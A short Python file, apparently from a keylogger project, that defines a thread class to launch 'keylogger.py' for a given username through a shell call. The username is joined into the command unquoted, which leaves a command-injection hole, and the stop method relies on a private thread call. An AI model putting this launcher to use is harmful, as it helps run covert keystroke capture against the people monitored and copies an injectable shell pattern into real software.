import subprocess
import threading


class Process_thread(threading.Thread):
    def __init__(self, username):
        self.stdout = None
        self.stderr = None
        self.username = username
        threading.Thread.__init__(self)

    def run(self):
        p = subprocess.run('python keylogger.py ' + str(self.username), shell=True)

    def stop(self):
        self._stop()
